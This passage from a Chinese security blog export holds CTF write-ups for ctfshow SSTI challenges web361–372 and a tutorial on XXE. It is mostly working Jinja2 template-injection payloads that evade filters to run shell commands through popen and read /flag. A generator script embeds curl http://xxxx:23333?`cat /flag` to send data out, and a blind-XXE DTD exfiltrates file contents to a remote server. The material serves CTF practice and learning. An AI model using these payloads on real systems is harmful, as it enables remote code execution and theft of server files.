<p>进而payload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
<p>一样的name传参，把上题的payload放了进去，给我回了个板脸</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
<p>不知道禁了什么，我们把payload一个字一个字拆开再用burpsuite爆破进行fuzz</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]需要拆解的文本为&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
<p>发现把2和3ban掉了，相当于想ban掉<code>os._wrap_close</code>呗</p>
<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
<p>payload4:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>最喜欢的最短的一个:</p>
<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
<p>变种最多的一集，在网上看到很多，不过都2024了还会有开发人员犯这个病吗，实战估计是用不到了</p>
<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
<p>参数逃逸，好喜欢，高效帅气巧妙</p>
<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>ban掉了arg和单双引号</p>
<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
<p>再在cookie加入<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>即可</p>
<p>我才知道cookie传多个值是需要分号而不是&amp;</p>
<p>而且这里传入的cookie不能有字符是url编码的，不知道是hackbar不帮我编码呢，还是服务器不帮我解码呢，还是说cookie本来就不需要url编解码</p>
<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>在前ban掉了arg和单双引号和中括号</p>
<p>和上题一样的payload</p>
<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>ban掉了下划线</p>
<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
<p>d原来之前可以不用cookie，用values就好</p>
<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>之前的基础上禁用了os</p>
<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
<p>这里get方法想出来很顺滑，因为一开始咱们想把os逃出来可以想的是reque.values.gogo，但是这个弄出来只能返回字符串”os”,并不能返回类os,所以用get</p>
<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#过滤了&#123;&#123;,用&#123;%%&#125;加print即可</span><br></pre></td></tr></table></figure>

<p>payload:<code>name=s&#123;%print((lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read())%&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
<p>print里的改为上面的payload2一样的</p>
<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><p>以上基础上ban了request</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h3><p>有点小复杂，要写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line"> payload=<span class="built_in">input</span>(<span class="string">&quot;要找啥&quot;</span>)</span><br><span class="line"> fpayload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">   url=<span class="string">f&quot;http://e870d70a-c035-4b9e-8e6c-f6137ed08cbe.challenge.ctf.show//?name=&#123;&#123;%print((config|string|list).pop(<span class="subst">&#123;i&#125;</span>).lower())%&#125;&#125;&quot;</span></span><br><span class="line">   r = requests.get(url=url)</span><br><span class="line">   index = r.text.find(<span class="string">&#x27;&lt;h3&gt;&#x27;</span>)</span><br><span class="line">   single = r.text[index+<span class="number">4</span>:index+<span class="number">5</span>].lower()</span><br><span class="line">  <span class="comment">#print(f&quot;[+]&#123;j&#125;&quot;)</span></span><br><span class="line">  <span class="comment">#print(single)</span></span><br><span class="line">   <span class="keyword">if</span> j==single:</span><br><span class="line">    fpayload+=<span class="string">f&quot;(config|string|list).pop(<span class="subst">&#123;i&#125;</span>)~&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(payload)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(fpayload)</span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;继续不&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>思路是把<code>&#123;%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%&#125;</code>这个里面的<code>__globals__</code>和<code>os</code>和<code>cat /flag</code>替换就好</p>
<p>payload:我的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read())%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>通过设置变量和拼接变量合成一句话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set init=(a,a,dict(init=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set chr=a.chr %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br><span class="line">#合成一句话：</span><br><span class="line">?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;% set chr=a.chr %&#125;</span><br><span class="line">&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 在__builtins__里面拿到chr，同样可以很方便的构造字符</span><br></pre></td></tr></table></figure>

<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><p>过滤了数字,要用cout构造数字</p>
<p>比如dict{aaaaaa&#x3D;a|join|cout}是等于6的，键值有多少个字符，这个表达式就代表几个数字，想办法用这个格式把上题的payload中的数字替换即可</p>
<p>payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#32</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#47</span><br><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #24</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125; #_</span><br><span class="line">&#123;%set o=dict(o=a,s=b)|join%&#125;</span><br><span class="line">#os</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">#得到__globals__前面的join是把globals变为字符串</span><br><span class="line">&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;</span><br><span class="line">#__builtins__</span><br><span class="line">&#123;%set c=dict(chr=a)|join%&#125;</span><br><span class="line">#chr</span><br><span class="line">&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;</span><br><span class="line">#chr函数</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">#cat /flag</span><br><span class="line">&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br><span class="line">#最终payload如下</span><br><span class="line">?name=&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set x=(()|select|string|list).pop(num)%&#125;&#123;%set o=dict(o=a,s=b)|join%&#125;&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;&#123;%set c=dict(chr=a)|join%&#125;&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set file = chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><p>过滤了print但还是可以执行命令，用curl带出flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set one=dict(b=j)|join|count%&#125;</span><br><span class="line">&#123;% set two=dict(bb=j)|join|count%&#125;</span><br><span class="line">&#123;% set three=dict(bbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set four=dict(bbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set five=dict(bbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set six=dict(bbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set seven=dict(bbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set eight=dict(bbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set nine=dict(bbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set ten=dict(bbbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set zero=(one-one)%&#125;</span><br><span class="line">&#123;% set pop=(four*six)%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(pop)%&#125;</span><br><span class="line">&#123;% set global=(a,a,dict(globals=d)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set go=(lipsum|attr(global)).get(built)%&#125;</span><br><span class="line">&#123;% set chr=go.chr%&#125;</span><br><span class="line">&#123;% set cmd=%&#125;</span><br><span class="line">&#123;%if go.eval(cmd)%&#125;</span><br><span class="line">yes</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<p>cmd生成脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eg:chr((six~five)|int)~chr((six~six|int))---&gt;AB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#替换123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a</span>):</span><br><span class="line">    change = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27;zero&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;one&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;two&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span> : <span class="string">&#x27;three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span> : <span class="string">&#x27;four&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span> : <span class="string">&#x27;five&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span> : <span class="string">&#x27;six&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span> : <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span> : <span class="string">&#x27;eight&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span> : <span class="string">&#x27;nine&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = change[a]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#拆解payload,并进行ascii转码保存在一个数组中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">devide</span>(<span class="params">payload</span>):</span><br><span class="line">    go = <span class="built_in">list</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(go):</span><br><span class="line">        go[i] = <span class="built_in">str</span>(<span class="built_in">ord</span>(val))</span><br><span class="line">    <span class="keyword">return</span> go</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取拼接的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">go</span>):</span><br><span class="line">    temp = <span class="built_in">list</span>(go)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(temp)-<span class="number">1</span>:</span><br><span class="line">            res+=change(val)+<span class="string">&quot;~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=change(val)</span><br><span class="line">    <span class="keyword">return</span> res    </span><br><span class="line">            </span><br><span class="line">payload = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxxx:23333?`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">ppp = devide(payload)</span><br><span class="line"><span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ppp):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(ppp)-<span class="number">1</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)~&quot;</span><span class="comment">#加int的原因是chr()只能传入数字,就是说不接受chr(&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>小弹一下,成功！</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240412172735048.png"  alt="image-20240412172735048"></p>
<h1 id="web-372"><a href="#web-372" class="headerlink" title="web 372"></a>web 372</h1><p>把count禁了，只需把上题的count换位length即可</p>
<h1 id="vulhub复现"><a href="#vulhub复现" class="headerlink" title="vulhub复现"></a>vulhub复现</h1><p>vulhub复现是不能用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;打而且有回显的，又能学到新东西</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__mro__[1].__subclasses__() %&#125;</span><br><span class="line">    &#123;% if i.__name__==&#x27;_wrap_close&#x27; %&#125;</span><br><span class="line">        &#123;% print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read() %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>这样还省去了写脚本的时间，多方便啊</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>入门</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞学习</title>
    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>

<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
<p>2.属性，与html几乎一样</p>
<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
<p>创建一个t.dtd文件</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
<p>正常显示</p>
<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
<p>2.%实体名;这个只能在dtd中使用</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
<p>　<strong>xml.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>　<strong>test.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>

<p>　<strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
<p>这里由于没有找到例题，直接抄合天的了</p>
<p>新学的linux命令</p>
<p>grep -i “GET” xxx.log</p>
<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>ctf</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>node.js原型链污染</title>
